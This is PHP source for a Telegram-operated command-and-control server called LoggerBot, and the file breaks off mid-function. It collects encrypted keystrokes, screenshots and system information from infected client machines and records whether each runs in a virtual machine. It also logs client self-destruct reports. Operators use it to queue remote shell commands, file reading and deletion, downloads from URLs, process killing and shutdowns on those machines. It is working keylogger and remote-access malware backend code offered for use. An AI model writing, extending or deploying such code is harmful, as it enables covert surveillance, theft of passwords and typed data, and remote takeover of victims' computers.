<?php
require_once __DIR__ . '/Config.php';

class LoggerBot {
    private $pdo;

    public function __construct() {
        $this->initDatabase();
        $this->initDirectories();
    }

    private function initDatabase() {
        try {
            $dsn = "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4";
            $this->pdo = new PDO($dsn, Config::$DB_USER, Config::$DB_PASS);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            $this->logError("Database connection failed: " . $e->getMessage());
            die("Database connection error");
        }
    }

    private function initDirectories() {
        $dirs = [Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR, dirname(Config::$ERROR_LOG)];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }

    public function handleRequest() {
        $rawInput = file_get_contents('php://input');
        $input = json_decode($rawInput, true) ?: [];
        $this->logWebhook("Raw request: $rawInput, POST: " . json_encode($_POST) . ", FILES: " . json_encode($_FILES));

        if (isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) && 
            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET) {
            $this->handleWebhook($input);
        } elseif ((isset($_SERVER['HTTP_X_SECRET_TOKEN']) && $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) || 
                 (isset($input['token']) && $input['token'] === Config::$SECRET_TOKEN) || 
                 (isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN)) {
            $this->handleClientRequest($input);
        } else {
            http_response_code(401);
            $this->logError("Unauthorized access attempt. Headers: " . json_encode($_SERVER));
            die(json_encode(['error' => 'Unauthorized']));
        }
    }

    private function handleWebhook($update) {
        if (!$update) {
            http_response_code(400);
            $this->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logWebhook(json_encode($update));
        
        if (isset($update['callback_query'])) {
            $this->handleCallbackQuery($update['callback_query']);
        } elseif (isset($update['message'])) {
            $this->processUpdate($update);
        }
        
        http_response_code(200);
    }

    private function handleCallbackQuery($callbackQuery) {
        $chatId = $callbackQuery['message']['chat']['id'] ?? null;
        $userId = $callbackQuery['from']['id'] ?? null;
        $data = $callbackQuery['data'] ?? null;
        $callbackQueryId = $callbackQuery['id'] ?? null;

        $this->logWebhook("Processing callback_query: id=$callbackQueryId, user_id=$userId, chat_id=$chatId, data=$data");

        if (!$chatId || !$userId || !$data || !$callbackQueryId) {
            $this->logError("Invalid callback_query: missing required fields, data=" . json_encode($callbackQuery));
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Error: Invalid request', 'show_alert' => true],
                false
            );
            return;
        }

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Unauthorized', 'show_alert' => true],
                false
            );
            return;
        }

        if (!str_contains($data, ':')) {
            $this->logError("Invalid callback_data format: $data");
            $this->sendTelegramMessage($chatId, "Error: Invalid callback data.");
            $this->makeCurlRequest(
                "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
                ['callback_query_id' => $callbackQueryId, 'text' => 'Invalid callback data', 'show_alert' => true],
                false
            );
            return;
        }

        list($action, $value) = explode(':', $data, 2);
        $this->logWebhook("Callback action: $action, value: $value");

        if ($action === 'select_client') {
            if ($this->clientExists($value)) {
                $this->setSelectedClient($userId, $value);
                $this->sendCommandKeyboard($chatId, "Selected client: $value. Choose a command:");
                $this->logWebhook("Client selected via callback: $value, user_id: $userId, chat_id: $chatId");
            } else {
                $this->sendTelegramMessage($chatId, "Client ID '$value' not found. Use /start to see available clients.");
                $this->logError("Invalid client_id in callback: $value, user_id: $userId, chat_id: $chatId");
            }
        } elseif ($action === 'command') {
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                $response = $this->processCommand($value, $selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$value' queued for client $selectedClient.");
                $this->logWebhook("Command queued: $value for client: $selectedClient, response: " . json_encode($response));
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
                $this->logError("Command attempted without selected client, command: $value, user_id: $userId, chat_id: $chatId");
            }
        } elseif ($action === 'file_action') {
            list($subAction, $path) = explode('|', $value, 2);
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                if ($subAction === 'read') {
                    $commandData = ['type' => 'file_operation', 'params' => ['action' => 'read', 'path' => $path]];
                    $this->queueClientCommand($selectedClient, $commandData);
                    $this->sendTelegramMessage($chatId, "Reading file: $path");
                } elseif ($subAction === 'delete') {
                    $commandData = ['type' => 'file_operation', 'params' => ['action' => 'delete', 'path' => $path]];
                    $this->queueClientCommand($selectedClient, $commandData);
                    $this->sendTelegramMessage($chatId, "Deleting file/folder: $path");
                }
                $this->logWebhook("File action queued: $subAction for path: $path, client: $selectedClient");
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        } else {
            $this->logError("Unknown callback action: $action, data: $data");
            $this->sendTelegramMessage($chatId, "Error: Unknown action.");
        }

        $this->makeCurlRequest(
            "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/answerCallbackQuery",
            ['callback_query_id' => $callbackQueryId],
            false
        );
    }

    private function setSelectedClient($userId, $clientId) {
        try {
            $stmt = $this->pdo->prepare(
                "INSERT INTO user_selections (user_id, selected_client, updated_at) 
                VALUES (?, ?, NOW()) 
                ON DUPLICATE KEY UPDATE selected_client = ?, updated_at = NOW()"
            );
            $stmt->execute([$userId, $clientId, $clientId]);
            $this->logWebhook("Set selected client: $clientId for user_id: $userId");
        } catch (PDOException $e) {
            $this->logError("Failed to set selected client for user_id: $userId, error: " . $e->getMessage());
        }
    }

    private function getSelectedClient($userId) {
        try {
            $stmt = $this->pdo->prepare("SELECT selected_client FROM user_selections WHERE user_id = ?");
            $stmt->execute([$userId]);
            $result = $stmt->fetch();
            $clientId = $result ? $result['selected_client'] : null;
            $this->logWebhook("Retrieved selected client: " . ($clientId ?: 'none') . " for user_id: $userId");
            return $clientId;
        } catch (PDOException $e) {
            $this->logError("Failed to get selected client for user_id: $userId, error: " . $e->getMessage());
            return null;
        }
    }

    private function handleClientRequest($input) {
        header('Content-Type: application/json');

        $data = array_merge($input, $_POST);
        $this->logWebhook("Client request data: " . json_encode($data));

        $action = $data['action'] ?? null;
        $clientId = $data['client_id'] ?? null;

        if (!$action || !$clientId) {
            http_response_code(400);
            $this->logError("Invalid client request: missing action or client_id. Input: " . json_encode($data));
            die(json_encode(['error' => 'Missing action or client_id']));
        }

        $this->updateClientStatus($clientId);

        switch ($action) {
            case 'get_commands':
                $response = $this->getClientCommands($clientId);
                break;
            case 'upload_data':
                $response = $this->handleUploadData($data);
                break;
            case 'command_response':
                $response = $this->handleCommandResponse($data);
                break;
            case 'upload_vm_status':
                $response = $this->handleUploadVMStatus($data);
                break;
            case 'report_self_destruct':
                $response = $this->handleSelfDestructReport($data);
                break;
            default:
                $response = ['error' => 'Unknown action'];
                break;
        }

        $this->logWebhook("Client request response for action: $action, client_id: $clientId, response: " . json_encode($response));
        echo json_encode($response);
    }

    private function handleSelfDestructReport($data) {
        try {
            $this->logWebhook("Self-destruct report: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Self-destruct report failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $report = '';
            if (isset($data['report']) && !empty($data['report'])) {
                $this->logWebhook("Received self-destruct report for client_id: $clientId, data: " . substr($data['report'], 0, 50) . "...");
                $report = $this->decrypt($data['report']);
                if ($report === '') {
                    $this->logError("Self-destruct report decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($report, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("Self-destruct report is not valid JSON for client_id: $clientId, data: " . substr($report, 0, 50) . "...");
                        $report = '';
                    } else {
                        $this->logWebhook("Decrypted self-destruct report for client_id: $clientId, length: " . strlen($report));
                    }
                }
            } else {
                $this->logWebhook("No self-destruct report provided for client_id: $clientId");
            }

            // اطلاع‌رسانی به ادمین تلگرام
            if ($report) {
                $reportData = json_decode($report, true);
                $message = "🚨 Self-destruct initiated for client $clientId!\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            // لاگ در دیتابیس
            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO client_logs (client_id, log_type, message, created_at) 
                    VALUES (?, 'self_destruct', ?, NOW())"
                );
                $stmt->execute([$clientId, $report]);
                $this->logWebhook("Logged self-destruct report for client_id: $clientId");
            } catch (PDOException $e) {
                $this->logError("Failed to log self-destruct report for client_id: $clientId, error: " . $e->getMessage());
            }

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Self-destruct report failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Report failed: ' . $e->getMessage()];
        }
    }

    private function handleUploadVMStatus($data) {
        try {
            $this->logWebhook("Upload VM status: " . json_encode($data));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Upload VM status failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $vmDetails = '';
            if (isset($data['vm_details']) && !empty($data['vm_details'])) {
                $this->logWebhook("Received vm_details for client_id: $clientId, data: " . substr($data['vm_details'], 0, 50) . "...");
                $vmDetails = $this->decrypt($data['vm_details']);
                if ($vmDetails === '') {
                    $this->logError("VM details decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($vmDetails, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("VM details is not valid JSON for client_id: $clientId, data: " . substr($vmDetails, 0, 50) . "...");
                        $vmDetails = '';
                    } else {
                        $this->logWebhook("Decrypted vm_details for client_id: $clientId, length: " . strlen($vmDetails));
                    }
                }
            } else {
                $this->logWebhook("No vm_details provided for client_id: $clientId");
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO client_vm_status (client_id, vm_details, created_at) 
                    VALUES (?, ?, NOW()) 
                    ON DUPLICATE KEY UPDATE vm_details = ?, created_at = NOW()"
                );
                $stmt->execute([$clientId, $vmDetails, $vmDetails]);
                $this->logWebhook("Inserted/Updated vm_details for client_id: $clientId, length: " . strlen($vmDetails));
            } catch (PDOException $e) {
                $this->logError("Database insertion failed for VM status, client_id: $clientId, error: " . $e->getMessage());
                throw new Exception("Database insertion failed: " . $e->getMessage());
            }

            // اطلاع‌رسانی به ادمین تلگرام
            if ($vmDetails) {
                $vmData = json_decode($vmDetails, true);
                $isVM = $vmData['is_vm'] ?? false;
                $message = $isVM 
                    ? "⚠️ Virtual Machine detected on client $clientId!\nDetails: " . json_encode($vmData['checks'], JSON_PRETTY_PRINT)
                    : "✅ Physical Machine confirmed for client $clientId.";
                $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
            }

            $this->logCommand($clientId, 'upload_vm_status', "VM Details: " . strlen($vmDetails) . " chars");

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Upload VM status failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function updateClientStatus($clientId) {
        try {
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
            $stmt = $this->pdo->prepare(
                "INSERT INTO clients (client_id, ip_address, is_online, last_seen, created_at) 
                VALUES (?, ?, 1, NOW(), NOW()) 
                ON DUPLICATE KEY UPDATE is_online = 1, last_seen = NOW(), ip_address = ?"
            );
            $stmt->execute([$clientId, $ipAddress, $ipAddress]);
            $this->logWebhook("Updated client status for client_id: $clientId, ip: $ipAddress");
        } catch (PDOException $e) {
            $this->logError("Failed to update client status: " . $e->getMessage());
        }
    }

    private function getClientCommands($clientId) {
        try {
            $stmt = $this->pdo->prepare(
                "SELECT id, command FROM client_commands 
                WHERE client_id = ? AND status = 'pending' 
                LIMIT 10"
            );
            $stmt->execute([$clientId]);
            $commands = $stmt->fetchAll();
    
            $this->logWebhook("Fetched commands for client_id: $clientId, count: " . count($commands));
            return ['commands' => $commands];
        } catch (PDOException $e) {
            $this->logError("Failed to fetch client commands for client_id: $clientId, error: " . $e->getMessage());
            return ['error' => 'Failed to fetch commands'];
        }
    }

    private function handleUploadData($data) {
        try {
            $this->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));

            $clientId = $data['client_id'] ?? null;
            if (!$clientId) {
                $this->logError("Upload data failed: Missing client_id");
                http_response_code(400);
                return ['error' => 'Missing client_id'];
            }

            $keystrokes = '';
            if (isset($data['keystrokes']) && !empty($data['keystrokes'])) {
                $this->logWebhook("Received keystrokes for client_id: $clientId, data: " . substr($data['keystrokes'], 0, 50) . "...");
                $keystrokes = $this->decrypt($data['keystrokes']);
                if ($keystrokes === '') {
                    $this->logError("Keystrokes decryption failed or empty for client_id: $clientId");
                } else {
                    $this->logWebhook("Decrypted keystrokes for client_id: $clientId, length: " . strlen($keystrokes));
                }
            } else {
                $this->logWebhook("No keystrokes provided for client_id: $clientId");
            }

            $systemInfo = '';
            if (isset($data['system_info']) && !empty($data['system_info'])) {
                $this->logWebhook("Received system_info for client_id: $clientId, data: " . substr($data['system_info'], 0, 50) . "...");
                $systemInfo = $this->decrypt($data['system_info']);
                if ($systemInfo === '') {
                    $this->logError("System_info decryption failed or empty for client_id: $clientId");
                } else {
                    $jsonCheck = json_decode($systemInfo, true);
                    if (json_last_error() !== JSON_ERROR_NONE) {
                        $this->logError("System_info is not valid JSON for client_id: $clientId, data: " . substr($systemInfo, 0, 50) . "...");
                        $systemInfo = '';
                    } else {
                        $this->logWebhook("Decrypted system_info for client_id: $clientId, length: " . strlen($systemInfo));
                    }
                }
            } else {
                $this->logWebhook("No system_info provided for client_id: $clientId");
            }

            $screenshotPath = null;
            if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
                $filename = 'screenshot_' . $clientId . '_' . time() . '.png';
                $screenshotPath = Config::$SCREENSHOT_DIR . $filename;
                if (!move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotPath)) {
                    $this->logError("Failed to save screenshot for client_id: $clientId");
                    $screenshotPath = null;
                } else {
                    $this->logWebhook("Saved screenshot for client_id: $clientId at $screenshotPath");
                }
            } else {
                $this->logWebhook("No screenshot provided or upload error for client_id: $clientId");
            }

            try {
                $stmt = $this->pdo->prepare(
                    "INSERT INTO user_data (client_id, keystrokes, system_info, screenshot_path, created_at) 
                    VALUES (?, ?, ?, ?, NOW())"
                );
                $stmt->execute([$clientId, $keystrokes, $systemInfo, $screenshotPath]);
                $this->logWebhook("Inserted user_data for client_id: $clientId, keystrokes_len: " . strlen($keystrokes) . ", system_info_len: " . strlen($systemInfo));
            } catch (PDOException $e) {
                $this->logError("Database insertion failed for client_id: $clientId, error: " . $e->getMessage());
                throw new Exception("Database insertion failed: " . $e->getMessage());
            }

            $this->logCommand($clientId, 'upload_data', "Keystrokes: " . strlen($keystrokes) . " chars, System Info: " . strlen($systemInfo));

            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Upload data failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleCommandResponse($data) {
        try {
            $commandId = $data['command_id'] ?? null;
            $result = isset($data['result']) ? $this->decrypt($data['result']) : '';
            if (!$commandId) {
                $this->logError("Missing command_id in command response");
                return ['error' => 'Missing command_id'];
            }
    
            $resultData = json_decode($result, true);
            $stmt = $this->pdo->prepare(
                "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                WHERE id = ?"
            );
            $stmt->execute([strlen($result) > 65000 ? 'Result too large, sent as file' : $result, $commandId]);
    
            $stmt = $this->pdo->prepare(
                "SELECT client_id, command FROM client_commands WHERE id = ?"
            );
            $stmt->execute([$commandId]);
            $commandData = $stmt->fetch();
            if ($commandData) {
                $clientId = $commandData['client_id'];
                $decryptedCommand = $this->decrypt($commandData['command']);
                $commandJson = json_decode($decryptedCommand, true);
                $commandType = $commandJson['type'] ?? 'unknown';
                $commandParams = $commandJson['params'] ?? [];
                
                if ($commandType === 'file_operation' && isset($commandParams['action'])) {
                    if ($commandParams['action'] === 'list' && isset($resultData['files'])) {
                        $this->sendFileList($clientId, $resultData['files'], $commandParams['path']);
                    } elseif ($commandParams['action'] === 'read' && isset($resultData['content'])) {
                        $this->sendFileContent($clientId, $resultData['content'], $resultData['file_path']);
                    } elseif ($commandParams['action'] === 'recursive_list' && isset($resultData['file_path'])) {
                        $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $resultData['file_path']);
                    } elseif ($commandParams['action'] === 'write' || $commandParams['action'] === 'delete') {
                        $this->sendTelegramMessage(
                            Config::$ADMIN_CHAT_ID,
                            "Command '$commandType' ($commandParams[action]) completed for client $clientId: $result"
                        );
                    }
                } elseif ($commandType === 'end_task' && isset($commandParams['process_name'])) {
                    $message = "Command 'end_task' for process '{$commandParams['process_name']}' on client $clientId: ";
                    if (isset($resultData['status']) && $resultData['status'] === 'success') {
                        $message .= "Successfully terminated.";
                    } else {
                        $message .= "Failed - " . ($resultData['message'] ?? 'Unknown error');
                    }
                    $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
                } else {
                    $this->sendTelegramMessage(
                        Config::$ADMIN_CHAT_ID,
                        "Command '$commandType' result for client $clientId:\n" . ($result ?: 'No result')
                    );
                }
            }
    
            $this->logWebhook("Updated command response for command_id: $commandId, result: " . substr($result, 0, 50));
            return ['status' => 'success'];
        } catch (PDOException $e) {
            $this->logError("Command response failed: " . $e->getMessage());
            return ['error' => 'Response processing failed'];
        }
    }

    private function sendFileList($clientId, $files, $path) {
        $message = "Files in `$path`:\n";
        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($files as $file) {
            $type = $file['type'] === 'directory' ? '📁' : '📄';
            $size = round($file['size'] / 1024, 2) . ' KB';
            $message .= "$type {$file['name']} ($size, {$file['modified']})\n";
            if ($file['type'] === 'file') {
                $row[] = ['text' => "Read {$file['name']}", 'callback_data' => "file_action:read|" . urlencode($path . '/' . $file['name'])];
                $row[] = ['text' => "Delete {$file['name']}", 'callback_data' => "file_action:delete|" . urlencode($path . '/' . $file['name'])];
            } else {
                $row[] = ['text' => "Browse {$file['name']}", 'callback_data' => "command:/browse " . urlencode($path . '/' . $file['name'])];
            }
            if (count($row) >= 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }
        
        if (strlen($message) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_list_$clientId.txt";
            file_put_contents($tempFile, $message);
            $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message, ['reply_markup' => $keyboard]);
        }
    }

    private function sendFileContent($clientId, $content, $filePath) {
        if (strlen($content) > 4000) {
            $tempFile = Config::$UPLOAD_DIR . "file_content_$clientId.txt";
            file_put_contents($tempFile, $content);
            $this->sendTelegramFile(Config::$ADMIN_CHAT_ID, $tempFile);
            unlink($tempFile);
        } else {
            $message = "Content of `$filePath`:\n```\n$content\n```";
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
        }
    }

    private function processUpdate($update) {
        if (!isset($update['message'])) {
            return;
        }

        $message = $update['message'];
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        if (!$this->isUserAuthorized($userId)) {
            $this->sendTelegramMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientExists($clientId)) {
                $this->setSelectedClient($userId, $clientId);
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
                $this->logWebhook("Client selected via /select: $clientId, user_id: $userId, chat_id: $chatId");
            } else {
                $this->sendTelegramMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logError("Invalid client_id in /select: $clientId, user_id: $userId, chat_id: $chatId");
            }
            return;
        }

        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
        } else {
            $selectedClient = $this->getSelectedClient($userId);
            if ($selectedClient) {
                $response = $this->processCommand($text, $selectedClient, true);
                $this->sendTelegramMessage($chatId, "Command '$text' queued for client $selectedClient.");
            } else {
                $this->sendTelegramMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
        }
    }

    private function isUserAuthorized($userId) {
        try {
            $stmt = $this->pdo->prepare("SELECT is_admin FROM users WHERE user_id = ? AND is_active = 1");
            $stmt->execute([$userId]);
            $user = $stmt->fetch();
            $isAuthorized = $user && $user['is_admin'] == 1;
            $this->logWebhook("Authorization check for user_id: $userId, authorized: " . ($isAuthorized ? 'yes' : 'no'));
            return $isAuthorized;
        } catch (PDOException $e) {
            $this->logError("Authorization check failed: " . $e->getMessage());
            return false;
        }
    }

    private function clientExists($clientId) {
        try {
            $stmt = $this->pdo->prepare("SELECT 1 FROM clients WHERE client_id = ?");
            $stmt->execute([$clientId]);
            return $stmt->fetch() !== false;
        } catch (PDOException $e) {
            $this->logError("Client existence check failed for client_id: $clientId, error: " . $e->getMessage());
            return false;
        }
    }

    private function sendClientKeyboard($chatId) {
        $clients = $this->getClientStatus();
        $this->logWebhook("Fetched clients for keyboard: " . json_encode($clients));

        if (empty($clients)) {
            $this->sendTelegramMessage($chatId, "No clients registered. Please ensure clients are connected. Use /select <client_id> to select directly.");
            $this->logError("No clients found for keyboard, chat_id: $chatId");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $row[] = [
                'text' => "$status {$client['client_id']} ($ip)",
                'callback_data' => "select_client:{$client['client_id']}"
            ];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending client keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $response = $this->sendTelegramMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
        $this->logWebhook("Telegram API response for keyboard: " . $response);
    }

    private function sendCommandKeyboard($chatId, $message) {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/upload' => 'Upload File',
            '/exec' => 'Execute Command',
            '/logs' => 'View Logs',
            '/hosts' => 'View Hosts',
            '/screens' => 'List Screenshots',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/test_telegram' => 'Test Telegram',
            '/upload_file' => 'Upload File',
            '/upload_url' => 'Upload from URL',
            '/tasks' => 'List Tasks',
            '/startup' => 'Manage Startup',
            '/signout' => 'Sign Out',
            '/sleep' => 'Sleep',
            '/restart' => 'Restart',
            '/listusers' => 'List Users',
            '/addadmin' => 'Add Admin',
            '/end_task' => 'End Task' // اضافه شده
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending command keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $this->sendTelegramMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }

    private function processCommand($command, $recipient, $isClient = false) {
        $command = trim($command);
        $this->logCommand($recipient, $command);

        $response = ['status' => 'success', 'data' => ''];
        $commandData = null;

        switch (true) {
            case preg_match('/^\/status$/', $command):
                $commandData = ['type' => 'system_info', 'params' => []];
                $response['data'] = 'System status command queued';
                break;

            case preg_match('/^\/screenshot$/', $command):
                $commandData = ['type' => 'capture_screenshot', 'params' => []];
                $response['data'] = 'Screenshot command queued';
                break;

            case preg_match('/^\/exec (.+)/', $command, $matches):
                $commandData = ['type' => 'system_command', 'params' => ['command' => $matches[1]]];
                $response['data'] = 'Execute command queued';
                break;

            case preg_match('/^\/hosts$/', $command):
                $commandData = ['type' => 'edit_hosts', 'params' => ['action' => 'list']];
                $response['data'] = 'Hosts command queued';
                break;

            case preg_match('/^\/browse\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'list', 'path' => $matches[1]]];
                $response['data'] = 'Browse directory command queued';
                break;

            case preg_match('/^\/browse_recursive\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'recursive_list', 'path' => $matches[1]]];
                $response['data'] = 'Recursive browse command queued';
                break;

            case preg_match('/^\/get-info$/', $command):
                $commandData = ['type' => 'system_info', 'params' => []];
                $response['data'] = 'System info command queued';
                break;

            case preg_match('/^\/go (.+)/', $command, $matches):
                $commandData = ['type' => 'open_url', 'params' => ['url' => $matches[1]]];
                $response['data'] = 'Open URL command queued';
                break;

            case preg_match('/^\/shutdown$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'shutdown']];
                $response['data'] = 'Shutdown command queued';
                break;

            case preg_match('/^\/upload (.+)/', $command, $matches):
            case preg_match('/^\/upload_file (.+)/', $command, $matches):
                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'telegram', 'file_url' => $matches[1], 'dest_path' => $matches[1]]];
                $response['data'] = 'Upload file command queued';
                break;

            case preg_match('/^\/upload_url (.+)/', $command, $matches):
                $commandData = ['type' => 'upload_file', 'params' => ['source' => 'url', 'file_url' => $matches[1], 'dest_path' => basename($matches[1])]];
                $response['data'] = 'Upload from URL command queued';
                break;

            case preg_match('/^\/tasks$/', $command):
                $commandData = ['type' => 'process_management', 'params' => ['action' => 'list']];
                $response['data'] = 'List tasks command queued';
                break;

            case preg_match('/^\/end_task\s+(.+)/', $command, $matches):
                $commandData = ['type' => 'end_task', 'params' => ['process_name' => $matches[1]]];
                $response['data'] = "End task command queued for process: {$matches[1]}";
                break;

            case preg_match('/^\/signout$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'signout']];
                $response['data'] = 'Sign out command queued';
                break;

            case preg_match('/^\/sleep$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'sleep']];
                $response['data'] = 'Sleep command queued';
                break;

            case preg_match('/^\/restart$/', $command):
                $commandData = ['type' => 'system_command', 'params' => ['command' => 'restart']];
                $response['data'] = 'Restart command queued';
                break;

            case preg_match('/^\/start$/', $command):
                $response['data'] = $isClient ? "Started" : $this->sendClientKeyboard($recipient);
                break;

            case preg_match('/^\/logs$/', $command):
            case preg_match('/^\/screens$/', $command):
            case preg_match('/^\/test_telegram$/', $command):
            case preg_match('/^\/startup$/', $command):
                $response['data'] = $isClient ? "Command not supported on client" : "Command executed on server";
                if (!$isClient) {
                    $this->sendTelegramMessage($recipient, "Command '$command' is server-side only.");
                }
                break;

            case preg_match('/^\/addadmin (\d+)$/', $command, $matches):
                if ($recipient == Config::$ADMIN_CHAT_ID) {
                    $response['data'] = $this->addAdmin($recipient, $matches[1], $isClient);
                } else {
                    $response = ['status' => 'error', 'data' => 'Only the primary admin can add admins.'];
                }
                break;

            case preg_match('/^\/listusers$/', $command):
                $response['data'] = $this->listUsers($recipient, $isClient);
                break;

            default:
                $response['data'] = $this->sendHelpMessage($recipient, $isClient);
                break;
        }

        if ($isClient && $commandData) {
            $this->queueClientCommand($recipient, $commandData);
        }

        return $response;
    }

    private function queueClientCommand($clientId, $commandData) {
        try {
            $encryptedCommand = $this->encrypt(json_encode($commandData));
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);
            $this->logWebhook("Queued command for client_id: $clientId, command: " . json_encode($commandData));
        } catch (PDOException $e) {
            $this->logError("Failed to queue client command: " . $e->getMessage());
        }
    }

    private function encrypt($data) {
        $iv = openssl_random_pseudo_bytes(16);
        $ciphertext = openssl_encrypt(
            $data,
            'aes-256-cbc',
            base64_decode(Config::$ENCRYPTION_KEY),
            0,
            $iv
        );
        if ($ciphertext === false) {
            $this->logError("Encryption failed for data: " . substr($data, 0, 50) . "...");
            return '';
        }
        return $ciphertext . '::' . base64_encode($iv);
    }

    private function decrypt($encryptedData) {
        try {
            if (!$encryptedData || !is_string($encryptedData)) {
                $this->logError("Invalid encrypted data: Not a string or empty: " . json_encode($encryptedData));
                return '';
            }

            if (!str_contains($encryptedData, '::')) {
                $this->logError("Invalid encrypted data format: Missing '::' separator: " . substr($encryptedData, 0, 50) . "...");
                return '';
            }

            list($ciphertext, $iv) = explode('::', $encryptedData, 2);
            if (empty($ciphertext) || empty($iv)) {
